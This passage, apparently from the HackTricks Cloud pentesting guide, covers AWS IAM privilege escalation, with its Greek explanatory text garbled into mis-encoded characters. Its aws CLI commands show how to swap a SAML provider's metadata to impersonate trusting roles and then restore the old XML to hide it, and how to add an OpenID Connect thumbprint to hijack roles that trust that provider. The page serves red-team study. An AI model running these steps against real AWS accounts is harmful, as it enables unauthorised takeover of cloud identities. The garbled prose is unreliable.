Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ ÎºÎ¬Î½Î¿Î½Ï„Î±Ï‚ Î±Ï…Ï„ÏŒ **Î¿Î¹ Î½ÏŒÎ¼Î¹Î¼Î¿Î¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î´ÎµÎ½ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸Î¿ÏÎ½**. Î©ÏƒÏ„ÏŒÏƒÎ¿, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€Î¬ÏÎµÏ„Îµ Ï„Î¿ XML, Î½Î± Î²Î¬Î»ÎµÏ„Îµ Ï„Î¿ Î´Î¹ÎºÏŒ ÏƒÎ±Ï‚, Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯Ï„Îµ ÎºÎ±Î¹ Î½Î± ÎµÏ€Î±Î½Î±Ï†Î­ÏÎµÏ„Îµ Ï„Î¿ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î¿.
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
TODO: ÎˆÎ½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î¿ Î¹ÎºÎ±Î½ÏŒ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Ï„Î± SAML metadata ÎºÎ±Î¹ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯ Î¼Îµ Î­Î½Î±Î½ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î¿ ÏÏŒÎ»Î¿
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

(Î‘Î²Î­Î²Î±Î¹Î¿ Î³Î¹Î± Î±Ï…Ï„ÏŒ) Î‘Î½ Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î­Ï‡ÎµÎ¹ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ **Î¬Î´ÎµÎ¹ÎµÏ‚** Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÎ¹ Î­Î½Î± Î½Î­Î¿ **Thumbprint** Î³Î¹Î± Î½Î± ÎºÎ±Ï„Î±Ï†Î­ÏÎµÎ¹ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯ ÏƒÎµ ÏŒÎ»Î¿Ï…Ï‚ Ï„Î¿Ï…Ï‚ ÏÏŒÎ»Î¿Ï…Ï‚ Ï€Î¿Ï… ÎµÎ¼Ï€Î¹ÏƒÏ„ÎµÏÎ¿Î½Ï„Î±Î¹ Ï„Î¿Î½ Ï€Î¬ÏÎ¿Ï‡Î¿.

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
{% endcode %}

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

{% hint style="success" %}
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
ÎœÎ¬Î¸ÎµÏ„Îµ & ÎµÎ¾Î±ÏƒÎºÎ·Î¸ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾Ï„Îµ Ï„Î¿ HackTricks</summary>

* Î”ÎµÎ¯Ï„Îµ Ï„Î± [**ÏƒÏ‡Î­Î´Î¹Î± ÏƒÏ…Î½Î´ÏÎ¿Î¼Î®Ï‚**](https://github.com/sponsors/carlospolop)!
* **Î“Î¯Î½ÎµÏ„Îµ Î¼Î­Î»Î¿Ï‚ Ï„Î·Ï‚** ğŸ’¬ [**Î¿Î¼Î¬Î´Î±Ï‚ Discord**](https://discord.gg/hRep4RUj7f) Î® Ï„Î·Ï‚ [**Î¿Î¼Î¬Î´Î±Ï‚ telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ hacking tricks Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ github.

</details>
{% endhint %}
